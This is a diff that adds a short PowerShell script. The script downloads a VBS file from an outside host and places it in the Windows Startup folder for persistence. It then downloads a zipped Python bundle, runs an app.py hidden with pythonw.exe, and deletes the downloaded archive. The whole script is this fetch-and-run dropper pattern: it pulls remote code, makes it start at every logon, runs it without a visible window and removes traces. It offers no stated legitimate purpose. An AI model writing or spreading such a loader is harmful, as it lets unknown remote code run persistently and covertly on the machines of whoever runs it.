@@ -1,0 +1,20 @@
+$login = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name -replace "^.*\\"
+
+Set-Location "C:\Users\$login"
+
+# Download startupi.vbs
+Invoke-WebRequest -Uri "https://isfooo.pythonanywhere.com/startup" -OutFile "./startupi.vbs"
+
+# Move to the Startup directory
+$startupDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
+Move-Item -Path "./startupi.vbs" -Destination $startupDir -Force
+
+# Download python.zip
+Invoke-WebRequest -Uri "https://isfooo.pythonanywhere.com/download" -OutFile "./python.zip"
+Expand-Archive -Path "./python.zip" -DestinationPath ".\python3"
+
+# Run pythonw.exe with app.py
+Start-Process -FilePath ".\python3\python\pythonw.exe" -ArgumentList ".\python3\python\app.py"
+
+# Remove downloaded files
+Remove-Item -Path "./python.zip" -Force
